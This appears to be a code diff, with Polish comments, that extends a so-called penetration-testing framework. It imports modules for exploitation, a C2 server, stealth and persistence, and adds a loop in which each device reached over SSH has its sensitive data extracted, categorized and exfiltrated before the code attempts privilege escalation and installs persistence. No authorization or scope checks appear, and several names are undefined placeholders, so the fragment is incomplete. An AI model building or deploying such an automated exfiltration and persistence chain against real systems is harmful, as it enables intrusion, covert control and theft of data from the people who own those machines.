@@ -1,0 +1,48 @@
+# W głównym pliku comprehensive_framework.py
+from exploitation_engine import ExploitationEngine
+from data_extraction import DataExtractor
+from data_categorization_exfiltration import DataCategorizer, ExfiltrationManager
+from c2_server import C2Server
+from stealth_techniques import StealthTechniques
+from mobile_iot_support import MobileIoTSupport
+from ml_adaptation import MLAdaptationFramework
+from privilege_escalation_persistence import PrivEscPersistenceFramework
+
+class ComprehensivePenTestFramework:
+    def __init__(self, config: Dict = None):
+        # ... istniejący kod ...
+        self.exploitation_engine = ExploitationEngine()
+        self.data_extractor = None
+        self.data_categorizer = DataCategorizer()
+        self.exfiltration_manager = ExfiltrationManager(config.get('exfiltration_config', {}))
+        self.stealth_techniques = StealthTechniques(config)
+        self.mobile_iot_support = MobileIoTSupport()
+        self.ml_adaptation = MLAdaptationFramework(config.get('ml_config', {}))
+        self.priv_esc_persistence = None
+        
+    async def run_comprehensive_scan(self, network_range: str = None) -> Dict:
+        # ... istniejący kod do skanowania ...
+        
+        for device in network_devices:
+            # ... uzyskanie dostępu ...
+            
+            if device.get('access_results'):
+                for access_method in device['access_results']['access_methods']:
+                    if access_method['service'] == 'ssh':
+                        # Ekstrakcja danych
+                        self.data_extractor = DataExtractor(access_method)
+                        extracted_data = self.data_extractor.extract_sensitive_data()
+                        device['extracted_data'] = extracted_data
+                        
+                        # Kategoryzacja i eksfiltracja
+                        categorized_data = self.data_categorizer.categorize_data(extracted_data)
+                        await self.exfiltration_manager.exfiltrate_data(device, categorized_data)
+                        
+                        # Eskalacja uprawnień i persistence
+                        self.priv_esc_persistence = PrivEscPersistenceFramework(access_method)
+                        if self.priv_esc_persistence.attempt_privilege_escalation():
+                            device['privilege_escalated'] = True
+                            self.priv_esc_persistence.establish_persistence()
+                            device['persistence_established'] = True
+                        
+                        self.data_extractor.close()
